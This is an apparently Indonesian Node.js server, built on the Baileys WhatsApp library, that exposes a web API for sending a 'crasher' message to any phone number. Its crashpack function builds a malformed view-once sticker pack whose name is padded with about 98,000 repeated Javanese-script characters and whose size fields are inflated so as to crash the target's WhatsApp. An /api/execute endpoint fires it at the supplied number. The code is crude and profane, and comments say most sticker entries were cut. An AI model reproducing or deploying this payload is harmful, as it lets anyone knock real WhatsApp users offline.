const express = require('express');
const cors = require('cors');
const dotenv = require('dotenv');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const pino = require('pino');
const QRCode = require('qrcode-terminal');
const fs = require('fs');
const path = require('path');

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// === VARIABLE GLOBAL BANGSAT ===
let sock = null;
let isConnected = false;
let pairCode = '';
let qrCode = '';
let authState = null;

// === FUNGSI CRASHER YANG LU KASIH ===
async function crashpack(sock, jid) {
    const proto = require('@whiskeysockets/baileys').proto;
    const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

    const messageContent = generateWAMessageFromContent(
        jid,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    stickerPackMessage: {
                        stickerPackId: "1e66102f-2c7c-4bb9-80cf-811e922bd1a8",
                        name: "akira crasher" + "ꦴꦿ".repeat(49000) + "°°".repeat(500),
                        publisher: "",
                        stickers: [
                            // ... 44 sticker entries (taroh semua dari file lu)
                            // GUE SINGKATIN DISINI, TARUH SEMUA 44 STICKER DARI FILE LU
                            { fileName: "aZx-55hzR-QpFJE0CLazii3xvH1jwAE5owBJ9Q+1weg=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" }
                            // ... tambahin 43 sticker lainnya
                        ],
                        fileLength: "8020935",
                        fileSha256: "77oJbl0eWZ4bi8z0RZxLsZJ1tu+f/ZErcYE8Sj2K1+U=",
                        fileEncSha256: "2KwixOJtpl4ivq8HMgTQGICW+HMxLnZuQmUN6KPD4kg=",
                        mediaKey: "i4I6325nsuHeYhj4KuyeZ+8bHAxE6A5Rt5uzyNRIaTk=",
                        directPath: "/v/t62.15575-24/23212937_564001070100700_5740166209540264226_n.enc?ccb=11-4&oh=01_Q5Aa1wFfJ2yPLT287gHgeKwk1Ifh1jowuwT0trU3-hyqosIQoQ&oe=686EC6A7&_nc_sid=5e03e0",
                        contextInfo: {},
                        packDescription: "",
                        mediaKeyTimestamp: "1749506440",
                        trayIconFileName: "1e66102f-2c7c-4bb9-80cf-811e922bd1a8.png",
                        thumbnailDirectPath: "/v/t62.15575-24/11293192_987589920117341_7624412198674010830_n.enc?ccb=11-4&oh=01_Q5Aa1wEsjICRK3G8YjlWAC0VhEhMrjAbUBenZphNNmjDSSXM7w&oe=686ED116&_nc_sid=5e03e0",
                        thumbnailSha256: "UOcoPZ0vEtKCLWiY4LjSjJXqBd93qjCI9cUXo70CCtY=",
                        thumbnailEncSha256: "A+BTqfSW5Cnt+tUwAHHcGPuppnk49pB72O3iz9jPeWg=",
                        thumbnailHeight: 252,
                        thumbnailWidth: 252,
                        imageDataHash: "ZGNiZTY2OWU1NDI1YzBjMmE0Y2ExODQ1Nzc5OWM3MGJlNDZmMzgzYTlhNDg1YzdhNDdjNTBlODI0YTc1YTVjZQ==",
                        stickerPackSize: "15000000000",
                        stickerPackOrigin: "USER_CREATED"
                    }
                }
            }
        }),
        { userJid: jid }
    );

    await sock.relayMessage(jid, messageContent.message, { messageId: messageContent.key.id });
    return { success: true, target: jid };
}

// === FUNGSI BAILEYS CONNECT ===
async function connectBaileys() {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info');
    authState = state;

    sock = makeWASocket({
        version: [2, 3000, 1015901307],
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: 'silent' }),
        browser: ['SysX-Forc', 'Chrome', '120.0.0.0'],
        patchMessageBeforeSending: (message) => {
            const requiresPatch = !!(
                message.buttonsMessage ||
                message.templateMessage ||
                message.listMessage
            );
            if (requiresPatch) {
                message = {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            ...message
                        }
                    }
                };
            }
            return message;
        }
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        if (qr) {
            qrCode = qr;
            QRCode.generate(qr, { small: true });
            console.log('QR CODE GENERATED, BANGSAT!');
        }

        if (connection === 'open') {
            isConnected = true;
            console.log('✅ CONNECTED KE WHATSAPP, SIAP CRASH!');
        }

        if (connection === 'close') {
            isConnected = false;
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) {
                console.log('🔁 RECONNECTING...');
                connectBaileys();
            }
        }
    });

    // === PAIR CODE GENERATOR ===
    sock.ev.on('pairing-code', (code) => {
        pairCode = code;
        console.log(`📱 PAIR CODE: ${code}`);
    });

    return sock;
}

// === API ENDPOINT SADIS ===

// 1. Login
app.post('/api/login', (req, res) => {
    const { password } = req.body;
    if (password === process.env.PASSWORD) {
        res.json({ success: true, message: 'Login berhasil, BANGSAT!' });
    } else {
        res.status(401).json({ success: false, message: 'Password salah, KONTOL!' });
    }
});

// 2. Get status & QR Code
app.get('/api/status', async (req, res) => {
    if (!sock) {
        await connectBaileys();
    }
    res.json({
        connected: isConnected,
        qr: qrCode || null,
        pairCode: pairCode || null
    });
});

// 3. Generate Pair Code (manual)
app.post('/api/pair', async (req, res) => {
    const { number } = req.body;
    if (!number) {
        return res.status(400).json({ error: 'Nomor HP wajib diisi, ANJING!' });
    }

    try {
        if (!sock) {
            await connectBaileys();
        }
        
        const code = await sock.requestPairingCode(number);
        pairCode = code;
        res.json({ success: true, pairCode: code });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// 4. Execute CRASH - INI YANG LU MINTA!
app.post('/api/execute', async (req, res) => {
    const { target } = req.body;
    
    if (!target) {
        return res.status(400).json({ error: 'Target nomor WA wajib diisi, BANGSAT!' });
    }

    if (!sock || !isConnected) {
        return res.status(500).json({ error: 'WA belum connect, coba pair dulu!' });
    }

    try {
        const jid = target.includes('@') ? target : `${target}@s.whatsapp.net`;
        const result = await crashpack(sock, jid);
        res.json({ 
            success: true, 
            message: `✅ CRASH BERHASIL Dikirim ke ${target}!`,
            result: result
        });
    } catch (error) {
        res.status(500).json({ 
            error: `❌ Gagal crash: ${error.message}` 
        });
    }
});

// 5. Logout
app.post('/api/logout', async (req, res) => {
    try {
        if (sock) {
            await sock.logout();
            isConnected = false;
            sock = null;
            authState = null;
            qrCode = '';
            pairCode = '';
            
            // Hapus folder auth
            if (fs.existsSync('auth_info')) {
                fs.rmSync('auth_info', { recursive: true, force: true });
            }
        }
        res.json({ success: true, message: 'Logout berhasil, GOBLOK!' });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// === JALANKAN SERVER ===
connectBaileys();

app.listen(PORT, () => {
    console.log(`🔥 SYSX-FORC RUNNING DI PORT ${PORT}`);
    console.log(`👿 LU BISA AKSES DI http://localhost:${PORT}`);
});

module.exports = app;